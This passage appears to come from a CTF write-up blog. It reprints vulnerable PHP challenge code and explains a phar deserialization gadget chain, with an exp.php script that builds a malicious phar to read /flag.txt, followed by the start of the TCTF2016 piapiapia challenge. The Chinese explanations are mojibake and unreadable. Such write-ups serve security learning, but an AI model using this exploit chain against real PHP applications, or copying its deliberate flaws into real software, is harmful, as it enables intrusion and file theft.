class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href="#" class="delete"&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;ç½‘ç›˜ç®¡ç†&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol class="breadcrumb"&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;ç®¡ç†é¢æ¿&lt;/li&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;&lt;label for="fileInput" class="fileLabel"&gt;ä¸Šä¼ æ–‡ä»¶&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class="active ml-auto"&gt;&lt;a href="#"&gt;ä½ å¥½ &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type="file" id="fileInput" class="hidden"&gt;</span><br><span class="line">&lt;div class="top" id="toast-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>in phar files , meta data was stored in serialized form, which affect many</p>
<p>functions to be dangerous, including :fileatime() filectime() file_exists() file_get_contents() file_put_contents() file() filegroup() fopen() fileinode() filemtime() fileowner() fileperms() is_dir() is_executable() is_file() is_link() is_readable() is_writable() is_writeable() parse_ini_file() copy() unlink() stat() readfile()</p>
</blockquote>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¦‚ä¸‹:</p>
<ol>
<li>
<p>ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶,å½“ç„¶åç¼€åè¦ä¿®æ”¹æˆjpg,pngæˆ–è€…gif</p>
</li>
<li>
<p>åœ¨ <code>delete.php</code> ä¸­è®¿é—®ä»–(<code>download.php</code> æœ‰ <code>base_dir</code>  é™åˆ¶)</p>
</li>
<li>
<p>in delete.php , <code>file_exists()</code> å¯ä»¥è§¦å‘ååºåˆ—åŒ–.</p>
</li>
<li>
<p>åªæœ‰<code>File</code>ç±»ä¸­çš„<code>close()</code>å‡½æ•°å¯ä»¥è·å–æ–‡ä»¶å†…å®¹,è€Œä¸”åªæœ‰<code>User</code>ç±»ä¸­çš„<code>__destruct</code>å‡½æ•°å¯ä»¥è§¦å‘ä»–,é‚£ä¹ˆæˆ‘ä»¬æ”¾å…¥pharæ–‡ä»¶ä¸­çš„åº”è¯¥æ˜¯<code>User</code>ç±»çš„åºåˆ—åŒ–,ä½†æ˜¯å˜é‡<code>db</code>åº”è¯¥æ˜¯<code>File</code>ç±»çš„å¯¹è±¡å—?</p>
</li>
<li>
<p>å¦‚æœçœŸçš„è¿™ä¹ˆåšçš„è¯,<code>flag.txt</code>è‚¯å®šä¼šè¢«è¯»å‡ºæ¥,ä½†æ˜¯æ²¡æœ‰åŠæ³•å»å°†ä»–è¯»å‡ºæ¥.è¿™ä¸ªæ—¶å€™å¼€å§‹è€ƒè™‘åˆ°åªæœ‰<code>Filelist</code>ç±»æœ‰å›æ˜¾çš„åŠŸèƒ½    .</p>
</li>
<li>
<p>åŒæ—¶ , <code>__call</code> å¯ä»¥å¤„ç†æœªçŸ¥çš„å‡½æ•°  , å¹¶è¯•å›¾è®©æ‰€æœ‰çš„<code>file</code> å¯¹è±¡å»è°ƒç”¨è¿™ä¸ªè¿™ä¸ªæœªçŸ¥çš„å‡½æ•°.</p>
</li>
<li>
<p>æ‰€ä»¥,æˆ‘ä»¬æœ€åçš„åˆ©ç”¨é“¾æ˜¯,<code>User.__destruct-&gt;Filelist.__destruct-&gt;Filelist.__call-&gt;File.close()</code>.</p>
</li>
<li>
<p>exp.php are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ini_set('phar.readonly',0);</span></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>Finally , go to delete.php and read phar file.</p>
<p><img src="/home/ch4ser/.config/Typora/typora-user-images/1562476007031.png" alt="1562476007031"></p>
<h2 id="TCTF2016-piapiapia">TCTF2016 piapiapia</h2>
<p>source code:</p>
<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $profile=$user-&gt;show_profile($username);</span><br><span class="line">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">        header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// ååºåˆ—åŒ–æ¼æ´</span></span><br><span class="line">        $profile = unserialize($profile);</span><br><span class="line"></span><br><span class="line">        $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">        $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">        $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶photoè¿™ä¸ªå˜é‡,é‚£ä¹ˆå°±å¯ä»¥æ‰“å¼€ä»»æ„æ–‡ä»¶äº†</span></span><br><span class="line">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è¿™é‡Œå¯ä»¥å°†nicknameå£°æ˜æˆä¸€ä¸ªæ•°ç»„æ¥ç»•è¿‡é™åˆ¶</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">        $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">        <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">        $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">        $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// å˜é‡photoè¦è¢«å¤„ç† </span></span><br><span class="line">        $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">        $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your 